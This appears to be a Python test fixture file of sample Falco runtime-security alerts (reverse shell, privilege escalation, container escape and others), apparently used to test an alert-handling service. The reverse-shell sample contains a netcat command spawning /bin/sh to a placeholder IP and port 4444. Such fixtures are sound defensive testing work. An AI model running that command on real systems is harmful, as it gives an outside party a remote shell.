"""
Sample Falco events for testing
"""

# Standard reverse shell event
REVERSE_SHELL_EVENT = {
    "output": "17:20:42.123456789: Critical Reverse shell detected",
    "priority": "Critical",
    "rule": "Reverse shell detected",
    "time": "2024-01-01T17:20:42.123456789Z",
    "output_fields": {
        "k8s.pod.name": "evil-pod",
        "k8s.ns.name": "default",
        "container.name": "hacker",
        "proc.cmdline": "nc -e /bin/sh 1.2.3.4 4444",
        "user.name": "root"
    }
}

# Privilege escalation event
PRIVILEGE_ESCALATION_EVENT = {
    "output": "17:20:42.123456789: Alert Privilege escalation attempt",
    "priority": "Alert",
    "rule": "Privilege escalation attempt",
    "time": "2024-01-01T17:20:42.123456789Z",
    "output_fields": {
        "k8s.pod.name": "suspicious-pod",
        "k8s.ns.name": "production",
        "container.name": "app",
        "proc.name": "setuid",
        "user.name": "app-user"
    }
}

# Network anomaly event
NETWORK_ANOMALY_EVENT = {
    "output": "17:20:42.123456789: Warning Suspicious network activity",
    "priority": "Warning",
    "rule": "Suspicious network activity",
    "time": "2024-01-01T17:20:42.123456789Z",
    "output_fields": {
        "k8s.pod.name": "network-pod",
        "k8s.ns.name": "default",
        "container.name": "network-container",
        "fd.dport": "4444",
        "fd.sip": "10.0.0.1"
    }
}

# Container escape event
CONTAINER_ESCAPE_EVENT = {
    "output": "17:20:42.123456789: Critical Container escape attempt detected",
    "priority": "Critical",
    "rule": "Container escape attempt",
    "time": "2024-01-01T17:20:42.123456789Z",
    "output_fields": {
        "k8s.pod.name": "escape-pod",
        "k8s.ns.name": "default",
        "container.name": "escape-container",
        "proc.name": "mount",
        "fd.name": "/proc/sys/kernel"
    }
}

# Low severity event
LOW_SEVERITY_EVENT = {
    "output": "17:20:42.123456789: Notice Unauthorized package installation",
    "priority": "Notice",
    "rule": "Unauthorized package installation",
    "time": "2024-01-01T17:20:42.123456789Z",
    "output_fields": {
        "k8s.pod.name": "package-pod",
        "k8s.ns.name": "default",
        "container.name": "package-container",
        "proc.cmdline": "apt-get install curl"
    }
}

# Malformed event (missing fields)
MALFORMED_EVENT = {
    "output": "Some output",
    "priority": "Warning"
    # Missing required fields
}

# Event with missing output_fields
INCOMPLETE_EVENT = {
    "output": "17:20:42.123456789: Warning Test event",
    "priority": "Warning",
    "rule": "Test rule",
    "time": "2024-01-01T17:20:42.123456789Z",
    "output_fields": {}
}

# High volume event sample (for load testing)
def generate_high_volume_events(count: int = 100):
    """Generate multiple events for load testing"""
    events = []
    for i in range(count):
        events.append({
            "output": f"17:20:42.123456789: Warning Test event {i}",
            "priority": "Warning",
            "rule": "Test rule",
            "time": "2024-01-01T17:20:42.123456789Z",
            "output_fields": {
                "k8s.pod.name": f"test-pod-{i}",
                "k8s.ns.name": "default",
                "container.name": f"container-{i}"
            }
        })
    return events
